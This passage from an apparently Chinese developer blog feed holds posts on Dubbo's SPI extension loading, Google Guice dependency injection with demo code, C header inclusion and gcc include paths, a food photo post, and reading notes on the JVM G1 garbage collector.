</li><li>能active。实现类加了Activate注解的。在ExtensionLoader.getActivateExtension时会根据当前的url(配置信息)中值来匹配Activate注解中指定的值是否能match，能match的表示是activate，意思是命中的。在过滤器扩展点中用到。比如这个过滤器是给CONSUMER group用。示例有ExceptionFilter等。同时该注解还能支持order属性来定义bean的顺序。     </li></ol><h2 id="扩展点使用"><a href="#扩展点使用" class="headerlink" title="扩展点使用"></a>扩展点使用</h2><h3 id="配置文件相关"><a href="#配置文件相关" class="headerlink" title="配置文件相关"></a>配置文件相关</h3><p>配置文件放在哪里？</p><ol><li>META-INF/dubbo/internal/配置文件  </li><li>META-INF/dubbo/配置文件  </li><li>META-INF/services/配置文件  </li></ol><p>配置文件名是顶层接口全限定名，比如：com.alibaba.dubbo.rpc.Protocol  </p><p>配置文件中内容：<br>一行是一个实现类的定义，大致是<br>beanName=实现类的class的全限定名，这个后面还可以接上#xxx（这个能力实际使用少）。beanName=这部分不是必须的。可以仅仅写实现类的全限定名。   </p><h3 id="注解相关"><a href="#注解相关" class="headerlink" title="注解相关"></a>注解相关</h3><h4 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h4><p>SPI注解用在顶层接口上，其值表示这个接口的默认实现类的beanName，也即是说指定一个顶层接口的默认实现通过SPI注解加载顶层接口上指定即可。  </p><h4 id="Adaptive"><a href="#Adaptive" class="headerlink" title="Adaptive"></a>Adaptive</h4><p>Adaptive注解用在顶层接口或者接口的方法上，其表示这个接口或者这个方法需要有adaptive的类委托完成，未加注解的会生成不支持的操作的方式实现。    </p><h4 id="Activate"><a href="#Activate" class="headerlink" title="Activate"></a>Activate</h4><p>Activate注解用在实现类上，其表示实现类在rpc时根据url参数中以及注解中指定的key 目标value是否能匹配来决定此bean是否被选中(一般用在过滤器的命中判断上)。  </p><h2 id="生成的代码"><a href="#生成的代码" class="headerlink" title="生成的代码"></a>生成的代码</h2><h3 id="adaptive类代码示例"><a href="#adaptive类代码示例" class="headerlink" title="adaptive类代码示例"></a>adaptive类代码示例</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.alibaba.dubbo.registry;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.extension.ExtensionLoader;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegistryFactory</span>$<span class="hljs-title">Adaptive</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">com</span>.<span class="hljs-title">alibaba</span>.<span class="hljs-title">dubbo</span>.<span class="hljs-title">registry</span>.<span class="hljs-title">RegistryFactory</span> </span>&#123;<span class="hljs-keyword">public</span> com.alibaba.dubbo.registry.<span class="hljs-function">Registry <span class="hljs-title">getRegistry</span><span class="hljs-params">(com.alibaba.dubbo.common.URL arg0)</span> </span>&#123;<span class="hljs-keyword">if</span> (arg0 == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"url == null"</span>);com.alibaba.dubbo.common.URL url = arg0;String extName = (url.getProtocol() == <span class="hljs-keyword">null</span> ? <span class="hljs-string">"dubbo"</span> : url.getProtocol());<span class="hljs-keyword">if</span> (extName == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"Fail to get extension(com.alibaba.dubbo.registry.RegistryFactory) name from url("</span> + url.toString()+ <span class="hljs-string">") use keys([protocol])"</span>);com.alibaba.dubbo.registry.RegistryFactory extension = (com.alibaba.dubbo.registry.RegistryFactory) ExtensionLoader.getExtensionLoader(com.alibaba.dubbo.registry.RegistryFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getExtension</span>(<span class="hljs-title">extName</span>)</span>;<span class="hljs-keyword">return</span> extension.getRegistry(arg0);&#125;&#125;</code></pre><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.alibaba.dubbo.rpc.cluster;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.extension.ExtensionLoader;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cluster</span>$<span class="hljs-title">Adaptive</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">com</span>.<span class="hljs-title">alibaba</span>.<span class="hljs-title">dubbo</span>.<span class="hljs-title">rpc</span>.<span class="hljs-title">cluster</span>.<span class="hljs-title">Cluster</span> </span>&#123;<span class="hljs-keyword">public</span> com.alibaba.dubbo.rpc.<span class="hljs-function">Invoker <span class="hljs-title">join</span><span class="hljs-params">(com.alibaba.dubbo.rpc.cluster.Directory arg0)</span></span><span class="hljs-function"><span class="hljs-keyword">throws</span> com.alibaba.dubbo.rpc.RpcException </span>&#123;<span class="hljs-keyword">if</span> (arg0 == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"com.alibaba.dubbo.rpc.cluster.Directory argument == null"</span>);<span class="hljs-keyword">if</span> (arg0.getUrl() == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"com.alibaba.dubbo.rpc.cluster.Directory argument getUrl() == null"</span>);com.alibaba.dubbo.common.URL url = arg0.getUrl();String extName = url.getParameter(<span class="hljs-string">"cluster"</span>, <span class="hljs-string">"failover"</span>);<span class="hljs-keyword">if</span> (extName == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"Fail to get extension(com.alibaba.dubbo.rpc.cluster.Cluster) name from url("</span> + url.toString()+ <span class="hljs-string">") use keys([cluster])"</span>);com.alibaba.dubbo.rpc.cluster.Cluster extension = (com.alibaba.dubbo.rpc.cluster.Cluster) ExtensionLoader.getExtensionLoader(com.alibaba.dubbo.rpc.cluster.Cluster<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getExtension</span>(<span class="hljs-title">extName</span>)</span>;<span class="hljs-keyword">return</span> extension.join(arg0);&#125;&#125;</code></pre><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>查找所有的dubbo扩展点形式的配置文件  </p><pre><code class="hljs shell">find ./ -type f -name "com.alibaba.dubbo*"|grep -v "/target/"|grep -v "/bin/"|grep -v "/test/"</code></pre><p>另：<br>关于代理模式，dubbo未实现通用的，只是rpc语义实现里rpc调用的代理，借助扩展点机器加动态代理完成。<br>具体其顶层接口是com.alibaba.dubbo.rpc.ProxyFactory。用在比如将EchoService编织进每次RPC调用中。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>guice的能力简述</title>
    <link href="/2020/04/20/guice-features-brief-introducting/"/>
    <url>/2020/04/20/guice-features-brief-introducting/</url>
    
    <content type="html"><![CDATA[<p>guice这个google出的bean容器框架，ES有用到他。  </p><h2 id="能干什么"><a href="#能干什么" class="headerlink" title="能干什么"></a>能干什么</h2><ol><li>是一个bean容器</li><li>能AOPa</li></ol><h2 id="能力细分与使用方式"><a href="#能力细分与使用方式" class="headerlink" title="能力细分与使用方式"></a>能力细分与使用方式</h2><ol><li>以module创建injector。可以看成是一个容器。Module需要自定义且继承自他的AbstractModule。覆写config方法完成装配关系的确定。详细参见<a href="https://gitee.com/xiaguangme/guice-demo/blob/master/src/main/java/com/code260/ss/guice/demo/bill/BillingModule.java" target="_blank" rel="noopener">这里</a>  </li><li>绑定顶层接口到具体实现类。bind(TransactionLog.class).to(DatabaseTransactionLog.class); 支持bind(A).to(B) 然后链式的 bind(B).to(C)</li><li>支持在构造函数上打上Inject注解标签，用于注入字段</li><li>支持自定义注解用于标志装配目标，比如自定义注解Paypal。  对于加了PayPal注解的参数，注入PaypalCreditCardProcessor实现，其余的注入GoogleCheckoutProcessor实现。bind(CreditCardProcessor.class).annotatedWith(PayPal.class).to(PaypalCreditCardProcessor.class);</li><li>对于加了Named注解 其值为testnamed的地方注入TestNamedCreditCardProcessor实现。bind(CreditCardProcessor.class).annotatedWith(Names.named(“testnamed”)).to(TestNamedCreditCardProcessor.class);</li><li>结合Named注解 可以将一个参数绑定一个特定的instance 而不是一个实现类。bind(Integer.class).annotatedWith(Names.named(“chargeTimeout”)).toInstance(200);</li><li>可以使用Provides注解 主动对外提供创建的bean 有点类似 Spring的@Bean注解，这种方式可以对bean做自定义加工。相当于反转了bind的那个动作  同时也可以结合 自定义注解 使用 比如上面的@Paypal 效果相同。但是这种方式创建的bean不能参与AOP 因为instance是用户创建的嘛,所以任何额外逻辑编编织不进去了。那怎么解决这个问题，guice在bind后提供了toConstructor方法去指定实现类。这样就连Inject注解都不需要了。因为这个实现类可能是三方提供的。</li><li>用自定义注解的方式结合bindInterceptor方式完成 本质上是个拦截器 AOP这些接口遵循AOP联盟约定。 有点类似jfinal的理念。</li></ol><h2 id="部分示例代码"><a href="#部分示例代码" class="headerlink" title="部分示例代码"></a>部分示例代码</h2><p>全部的参见<a href="https://gitee.com/xiaguangme/guice-demo" target="_blank" rel="noopener">这里</a>  </p><h3 id="测试主类"><a href="#测试主类" class="headerlink" title="测试主类"></a>测试主类</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.guice.demo.bill;<span class="hljs-keyword">import</span> com.google.inject.Guice;<span class="hljs-keyword">import</span> com.google.inject.Injector;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestMain</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 1. 以module创建injector</span><span class="hljs-comment">         */</span>        Injector injector = Guice.createInjector(<span class="hljs-keyword">new</span> BillingModule());        RealBillingService billingService = injector.getInstance(RealBillingService<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;        billingService.chargeOrder(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);        TestCustomAnnotationBillingService testCustomAnnotationBillingService = injector.getInstance(TestCustomAnnotationBillingService<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;        testCustomAnnotationBillingService.chargeOrder(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);        TestNamedBillingService testNamedBillingService = injector.getInstance(TestNamedBillingService<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>;        testNamedBillingService.chargeOrder(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);    &#125;&#125;</code></pre><h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.guice.demo.bill;<span class="hljs-keyword">import</span> com.google.inject.AbstractModule;<span class="hljs-keyword">import</span> com.google.inject.Provides;<span class="hljs-keyword">import</span> com.google.inject.matcher.Matcher;<span class="hljs-keyword">import</span> com.google.inject.matcher.Matchers;<span class="hljs-keyword">import</span> com.google.inject.name.Names;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillingModule</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractModule</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">configure</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 2. 绑定接口到实现类</span><span class="hljs-comment">         */</span>        <span class="hljs-comment">/**</span><span class="hljs-comment">         * LinkedBindings</span><span class="hljs-comment">         * 支持 bind(A).to(B) 然后链式的 bind(B).to(C)</span><span class="hljs-comment">         * to完之后 还支持in in后面接的是Scope 有Singleton</span><span class="hljs-comment">         */</span>        bind(TransactionLog<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">to</span>(<span class="hljs-title">DatabaseTransactionLog</span>.<span class="hljs-title">class</span>)</span>;        bind(CreditCardProcessor<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">to</span>(<span class="hljs-title">GoogleCheckoutProcessor</span>.<span class="hljs-title">class</span>)</span>;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 6. 结合Named注解 可以将一个参数绑定一个特定的instance 而不是一个实现类</span><span class="hljs-comment">         */</span>        bind(Integer.class).annotatedWith(Names.named("chargeTimeout")).toInstance(200);        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 4. 对于加了PayPal注解的参数，注入PaypalCreditCardProcessor实现，其余的注入GoogleCheckoutProcessor实现</span><span class="hljs-comment">         */</span>        bind(CreditCardProcessor<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">annotatedWith</span>(<span class="hljs-title">PayPal</span>.<span class="hljs-title">class</span>).<span class="hljs-title">to</span>(<span class="hljs-title">PaypalCreditCardProcessor</span>.<span class="hljs-title">class</span>)</span>;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 5. 对于加了Named注解 其值为testnamed的地方注入TestNamedCreditCardProcessor实现</span><span class="hljs-comment">         */</span>        bind(CreditCardProcessor.class).annotatedWith(Names.named("testnamed")).to(TestNamedCreditCardProcessor.class);        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 8. 用自定义注解的方式结合bindInterceptor方式完成 本质上是个拦截器 有点类似jfinal的理念</span><span class="hljs-comment">         */</span>        bindInterceptor(Matchers.any(), Matchers.annotatedWith(NonWeekend<span class="hljs-class">.<span class="hljs-keyword">class</span>), <span class="hljs-title">new</span> <span class="hljs-title">NotOnWeekendsInterceptor</span>())</span>;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 7. 可以使用Provides注解 主动对外提供创建的bean 有点类似 Spring的<span class="hljs-doctag">@Bean</span>注解，这种方式可以对bean做自定义加工</span><span class="hljs-comment">     * 相当于反转了bind的那个动作  同时也可以结合 自定义注解 使用 比如上面的<span class="hljs-doctag">@Paypal</span> 效果相同</span><span class="hljs-comment">     * 但是这种方式创建的bean不能参与AOP 因为instance是用户创建的嘛,所以任何额外逻辑编编织不进去了。</span><span class="hljs-comment">     * 那怎么解决这个问题，guice在bind后提供了toConstructor方法去指定实现类。</span><span class="hljs-comment">     * 这样就连Inject注解都不需要了。因为这个实现类可能是三方提供的</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Provides</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> AlertService <span class="hljs-title">provideAlertService</span><span class="hljs-params">()</span> </span>&#123;        RedAlertService redAlertService = <span class="hljs-keyword">new</span> RedAlertService();        redAlertService.setTestAttribute();        <span class="hljs-keyword">return</span> redAlertService;    &#125;&#125;</code></pre><h3 id="用于AOP的拦截器类"><a href="#用于AOP的拦截器类" class="headerlink" title="用于AOP的拦截器类"></a>用于AOP的拦截器类</h3><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.code260.ss.guice.demo.bill;<span class="hljs-keyword">import</span> org.aopalliance.intercept.MethodInterceptor;<span class="hljs-keyword">import</span> org.aopalliance.intercept.MethodInvocation;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotOnWeekendsInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">MethodInterceptor</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(MethodInvocation methodInvocation)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;        System.out.println(<span class="hljs-string">"do something before NotOnWeekendsInterceptor invoke"</span>);        Object result =  methodInvocation.proceed();        System.out.println(<span class="hljs-string">"do something after NotOnWeekendsInterceptor invoke"</span>);        <span class="hljs-keyword">return</span> result;    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>guice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用部分函数时并未include其所在头文件，但是能编译成功且能运行，为什么？</title>
    <link href="/2020/04/20/not-include-but-why-successfully/"/>
    <url>/2020/04/20/not-include-but-why-successfully/</url>
    
    <content type="html"><![CDATA[<p>最近在看APUE，试了上面的一些例子，其中有个例子是使用getpid函数获取进程id，但是在我写demo时，并未引入其所在的头文件unistd.h，结果也能编译成功，也能运行，于是就琢磨下为啥。<br>Environment info: Ubuntu 18.04.2 LTS, gcc (Ubuntu 4.8.5-4ubuntu8) 4.8.5<br>示意代码如下：  </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;    <span class="hljs-keyword">long</span> pid = (<span class="hljs-keyword">long</span>)getpid();    <span class="hljs-keyword">long</span> test = pid + <span class="hljs-number">1</span>;&#125;</code></pre><p>在satckoverflow上有人告诉我，因为我用的是GCC4系列，使用是的C90标准且自带GUN扩展，所以对这种问题不给出警告，且能成功运行。<br>如果是C99标准就会编译时有警告。<br>同时指出即使能成功运行但是这是一个不好的习惯，所以还是要严格include  </p><p>我意外试了下 在CDT中可以一样使用ctrl+shift+o 进行自动include<br>也可以使用  ctrl+shift+T 进行库查找…  </p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c cpp编程用到的系统边角与其拾遗</title>
    <link href="/2020/04/20/cpp-programming-scraps/"/>
    <url>/2020/04/20/cpp-programming-scraps/</url>
    
    <content type="html"><![CDATA[<h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><p>Q：unix编程怎么查一个函数在哪个头文件中<br>A: 可以用诸如 man 3 printf  </p><p>Q: man后面接个数字什么意思，如man 3 printf<br>A：如下 man man中的引用</p><blockquote><p>下表显示了手册的 章节 号及其包含的手册页类型。<br>1   可执行程序或 shell 命令<br>2   系统调用(内核提供的函数)<br>3   库调用(程序库中的函数)<br>4   特殊文件(通常位于 /dev)<br>5   文件格式和规范，如 /etc/passwd<br>6   游戏<br>7   杂项(包括宏包和规范，如 man(7)，groff(7))<br>8   系统管理命令(通常只针对 root 用户)<br>9   内核例程 [非标准  </p></blockquote><p>Q: 怎么在man的所有章节中搜索<br>A： man -k printf   </p><pre><code class="hljs shell">appweb@simon-ububtu18-desk-2:~/600.self/03.code/01.cpp/03.APUE$ man -k printfasprintf (3)         - print to allocated stringdprintf (3)          - formatted output conversionfprintf (3)          - formatted output conversionfwprintf (3)         - formatted wide-character output conversionprintf (1)           - format and print dataprintf (3)           - formatted output conversionsnprintf (3)         - formatted output conversionsprintf (3)          - formatted output conversionswprintf (3)         - formatted wide-character output conversionvasprintf (3)        - print to allocated stringvdprintf (3)         - formatted output conversionvfprintf (3)         - formatted output conversionvfwprintf (3)        - formatted wide-character output conversionvprintf (3)          - formatted output conversionvsnprintf (3)        - formatted output conversionvsprintf (3)         - formatted output conversionvswprintf (3)        - formatted wide-character output conversionvwprintf (3)         - formatted wide-character output conversionwprintf (3)          - formatted wide-character output conversionXtAsprintf (3)       - memory management functions</code></pre><p>可以看到1和3中都有  1中是对应shell的 3中对应的是程序库中的    </p><p>Q: 怎么查看编译器在哪些路径中搜索头文件<br>A：如下：<br>可以参见 <a href="https://stackoverflow.com/questions/344317/where-does-gcc-look-for-c-and-c-header-files" target="_blank" rel="noopener">https://stackoverflow.com/questions/344317/where-does-gcc-look-for-c-and-c-header-files</a><br>大意与验证如下：  </p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 对于c++的如下： </span>appweb@simon-ububtu18-desk-2:~/600.self/03.code/01.cpp/03.APUE$ `gcc -print-prog-name=cc1plus` -vignoring nonexistent directory "/usr/lib/gcc/x86_64-linux-gnu/4.8/../../../../x86_64-linux-gnu/include"<span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">"..."</span> search starts here:</span><span class="hljs-meta">#</span><span class="bash">include &lt;...&gt; search starts here:</span> /usr/include/c++/4.8 /usr/include/x86_64-linux-gnu/c++/4.8 /usr/include/c++/4.8/backward /usr/lib/gcc/x86_64-linux-gnu/4.8/include /usr/local/include /usr/lib/gcc/x86_64-linux-gnu/4.8/include-fixed /usr/includeEnd of search list.^C<span class="hljs-meta">#</span><span class="bash"> 对于c的如下：  </span>appweb@simon-ububtu18-desk-2:~/600.self/03.code/01.cpp/03.APUE$ `gcc -print-prog-name=cpp` -vUsing built-in specs.COLLECT_GCC=cppOFFLOAD_TARGET_NAMES=nvptx-noneOFFLOAD_TARGET_DEFAULT=1Target: x86_64-linux-gnuConfigured with: ../src/configure -v --with-pkgversion='Ubuntu 7.4.0-1ubuntu1~18.04.1' --with-bugurl=file:///usr/share/doc/gcc-7/README.Bugs --enable-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++ --prefix=/usr --with-gcc-major-version-only --program-suffix=-7 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --enable-default-pie --with-system-zlib --with-target-system-zlib --enable-objc-gc=auto --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnuThread model: posixgcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1) COLLECT_GCC_OPTIONS='-E' '-v' '-mtune=generic' '-march=x86-64' /usr/lib/gcc/x86_64-linux-gnu/7/cc1 -E -quiet -v -imultiarch x86_64-linux-gnu - -mtune=generic -march=x86-64 -fstack-protector-strong -Wformat -Wformat-securityignoring nonexistent directory "/usr/local/include/x86_64-linux-gnu"ignoring nonexistent directory "/usr/lib/gcc/x86_64-linux-gnu/7/../../../../x86_64-linux-gnu/include"<span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">"..."</span> search starts here:</span><span class="hljs-meta">#</span><span class="bash">include &lt;...&gt; search starts here:</span> /usr/lib/gcc/x86_64-linux-gnu/7/include /usr/local/include /usr/lib/gcc/x86_64-linux-gnu/7/include-fixed /usr/include/x86_64-linux-gnu /usr/includeEnd of search list.</code></pre>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白菜油渣</title>
    <link href="/2020/04/19/cabbage-residue/"/>
    <url>/2020/04/19/cabbage-residue/</url>
    
    <content type="html"><![CDATA[<p>白菜炒猪油渣，朴素的美食</p><p><img src="/img/food/WechatIMG317.jpeg" srcset="/img/loading.gif" alt="白菜炒猪油渣"></p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>food</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《JVM G1源码分析和调优》读书笔记</title>
    <link href="/2020/04/19/jvm-g1-gc-book/"/>
    <url>/2020/04/19/jvm-g1-gc-book/</url>
    
    <content type="html"><![CDATA[<h2 id="GC的相关算法与JVM的垃圾收集器"><a href="#GC的相关算法与JVM的垃圾收集器" class="headerlink" title="GC的相关算法与JVM的垃圾收集器"></a>GC的相关算法与JVM的垃圾收集器</h2><h3 id="GC的相关算法"><a href="#GC的相关算法" class="headerlink" title="GC的相关算法"></a>GC的相关算法</h3><ul><li>分代管理</li><li>复制算法</li><li>标记清除</li><li>标记压缩</li></ul><h3 id="JVM垃圾收集器"><a href="#JVM垃圾收集器" class="headerlink" title="JVM垃圾收集器"></a>JVM垃圾收集器</h3><p>P242 表11-1 不同类型垃圾回收期比较  </p><ul><li>串行收集器 Serial。  Serial GC用于新生代，用了复制算法；Serial Old GC作用于老年代，用的是标记-压缩算法。STW</li><li>并行收集器 Parallel。Parallel new作用于新生代，使用了复制算法；Parallel old作用于老年代，用了标记-压缩算法。STW。并发收集是准确收集，不会产生浮动垃圾。</li><li>并发收集器 Concurrent-Mark-Sweep。老年代垃圾回收器。使用了标记-清除算法。分为初始标记(Initial-Mark,STW)、并发标记(Concurrent-Mark)、再次标记(Remark,STW)、并发清除(Concurrent-Sweep)。CMS因为需要存储代际的引用关系，所以有额外的存储空间的消耗。CMS不是准确收集，会产生浮动垃圾。</li><li>垃圾优先收集器 G1。按照分区进行收集，新生代的分区总是会回收，老生代则是并发标记后选择部分回收效果最好的分区。G1分为三种回收方式：<code>新生代回收</code>young、<code>混合回收</code>(mixed，既收集新生代也收集部分老年代)、<code>FUll GC</code>。<code>新生代回收</code>仅仅在开始前需要STW。<code>混合回收</code>分成两个阶段：并发标记阶段与垃圾回收阶段。并发标记阶段又分四个步骤：初始标记子阶段(initital-mark)、并发标记子阶段(concurrent-mark)、再标记子阶段(remark,STW)、清理子阶段(cleanup,STW)。因分区设计，G1引用关系的存储占用额外空间的消耗较大。G1不是准确收集，会产生浮动垃圾。</li></ul><h2 id="G1基本概念"><a href="#G1基本概念" class="headerlink" title="G1基本概念"></a>G1基本概念</h2><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>G1是将内存分成一个个小区域使用。这些区域称之为Heap Region。扩展的有<code>YHR</code>(新生代分区)，<code>OHR</code>(老生代分区)，<code>HHR</code>(大对象分区)等等<br>为了达到分配效率与清理效率的平衡，HR的大小有上下限值，即1MB-32MB。结合整个堆空间分为2048个HR，那么通常G1管理的最大的堆是32MB*2048=64G。  </p><h3 id="新生代大小"><a href="#新生代大小" class="headerlink" title="新生代大小"></a>新生代大小</h3><h4 id="用参数设置使得G1能推断出最大值与最小值"><a href="#用参数设置使得G1能推断出最大值与最小值" class="headerlink" title="用参数设置使得G1能推断出最大值与最小值"></a>用参数设置使得G1能推断出最大值与最小值</h4><p>涉及的参数有:</p><ul><li>新生代最大值MaxNewSize、最小值NewSize、Xmn(等价于MaxNewSize和NewSize，且MaxNewSize=NewSize)</li><li>NewRatio，如果上条参数设置了，则忽略本参数</li><li>如果仅仅设置了NewRatio，则新生代最大值与最小值相同：整个堆空间/(newRatio+1)</li><li>如果没有设置最大值和最小值，或者只设置了其中一个，那么G1将根据参数G1MaxNewSizePercent(默认60)和G1NewSizePercent(默认是5)占整个堆空间的比例来计算。</li></ul><p><strong>如果G1推断出的新生代的最大值与最小值相等，则说明新生代不会动态变化，不会动态变化则可能导致后续新生代GC时不能满足期望的停顿时间</strong>，所以有文章提到G1不建议设置Xmn参数。  </p><p>相关代码在 share/vm/gc_implementation/g1/g1collectorPolicy.cpp  </p><h3 id="G1启发式推断新生代大小"><a href="#G1启发式推断新生代大小" class="headerlink" title="G1启发式推断新生代大小"></a>G1启发式推断新生代大小</h3><p>G1有一个线程专门抽样处理预测新生代列表的长度应该多大，并动态调整。  </p><p>何时扩展以及一次扩展多少内存？<br>参数-XX:GCTimeRatio 表示GC与应用的耗费时间的比，G1默认是9。也就是说GC的耗时与应用耗时占比超过10%时，进行动态扩展。扩展大小的参数是G1ExpandByPercentOfAvailable，同时至少大于1MB，至多不能超过当前已经分配的大小的一倍。<br>代码在 size_t G1CollectorPolicy::expansion_amount()….<br>该书在第五章讲refine线程时对此点有更详细的阐述  </p><h3 id="G1停顿预测模型"><a href="#G1停顿预测模型" class="headerlink" title="G1停顿预测模型"></a>G1停顿预测模型</h3><p>比较偏数学 我就很快跳过去了<br>G1的预测逻辑是基于衰减平均(Decaying Average)和衰减标准差。  </p><h3 id="卡表和位图"><a href="#卡表和位图" class="headerlink" title="卡表和位图"></a>卡表和位图</h3><p>卡表(CardTable)是CMS中中常见概念之一。我理解成分区间对象引用关系的描述 的存放处或者说存放的数据结构。此书也是讲的较为简略，细节可以参见《垃圾回收算法手册：自动内存管理的艺术》  </p><h3 id="对象头"><a href="#对象头" class="headerlink" title="对象头"></a>对象头</h3><p>讲JVM内存模型必讲对象头。可以参见我写的<a href="cnblogs.com/simoncook/p/11804427.html">JVM中对象模型及相应名词概念</a>  </p><h3 id="栈帧、线程等"><a href="#栈帧、线程等" class="headerlink" title="栈帧、线程等"></a>栈帧、线程等</h3><p>栈帧可以参见 封亚飞 写的《揭秘Java虚拟机》第七章 Java栈帧，写的更详细。此书只是一笔带过，看了跟没看没啥差别。  </p><h2 id="G1的对象分配"><a href="#G1的对象分配" class="headerlink" title="G1的对象分配"></a>G1的对象分配</h2><ul><li>快速分配与慢速分配</li><li>快速分配通过TLAB(Thread Local Allocation Buffer)实现。TLAB自己的分配是CAS操作。TLAB内部给对象分配是无锁的，因为只有自己线程用嘛。  